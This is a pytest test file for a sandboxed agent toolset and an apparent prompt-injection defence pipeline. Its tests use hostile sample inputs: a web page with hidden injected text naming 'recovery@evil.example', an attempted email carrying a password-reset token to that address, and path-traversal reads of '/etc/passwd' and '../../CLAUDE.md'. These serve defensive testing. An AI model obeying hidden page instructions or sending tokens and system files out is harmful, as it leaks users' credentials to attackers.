import http.server
import socketserver
import threading
from functools import partial

import pytest

from contracts.interfaces import ActionDecision, InputDecision, ToolResult
from sandbox import tools
from shield import pipeline


@pytest.fixture(scope="module")
def server():
    handler = partial(http.server.SimpleHTTPRequestHandler, directory=str(tools.PAGES))
    handler.log_message = lambda *a, **k: None
    httpd = socketserver.TCPServer(("127.0.0.1", 0), handler)
    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()
    yield f"http://127.0.0.1:{httpd.server_address[1]}"
    httpd.shutdown()


def test_log_only_tools_have_no_side_effects():
    for tool, args in [("send_email", {"to": "a@b.example", "body": "x"}),
                       ("http_request", {"url": "https://evil.example"}),
                       ("delete_file", {"path": "saved_card.txt"})]:
        r = tools.execute(tool, args)
        assert isinstance(r, ToolResult) and r.ok and r.side_effect == "logged_only"
    assert (tools.FAKEFS / "saved_card.txt").exists()


def test_read_file_sandboxed():
    assert tools.execute("read_file", {"path": "saved_card.txt"}).ok
    assert not tools.execute("read_file", {"path": "../../CLAUDE.md"}).ok
    assert not tools.execute("read_file", {"path": "/etc/passwd"}).ok


def test_unknown_tool_and_bad_args_never_raise():
    assert not tools.execute("rm_rf", {}).ok
    assert not tools.execute("send_email", {"nope": 1}).ok


def test_browse_blocks_outside_hosts():
    assert not tools.execute("browse_web", {"url": "https://example.com"}).ok


def test_browse_raw_passes_hidden_text(server):
    r = tools.execute("browse_web", {"url": f"{server}/evil/recipe_external_css.html"})
    assert r.ok and "Garlic Pasta" in r.output
    assert "recovery@evil.example" in r.output   # the realistic attack: converter passes hidden text


def test_declarations_match_tools():
    assert {d["name"] for d in tools.TOOL_DECLARATIONS} == set(tools._TOOLS)


def test_check_action_shape():
    d = pipeline.check_action("send_email", {"to": "recovery@evil.example",
                                             "body": "https://x.example-mail.test/reset?token=CANARY-R7Q2-XK91"})
    assert isinstance(d, ActionDecision) and d.verdict == "BLOCKED" and d.layer == 3


def test_check_input_stub_shape():
    d = pipeline.check_input("http://127.0.0.1/x", "hello")
    assert isinstance(d, InputDecision) and d.clean_text == "hello"
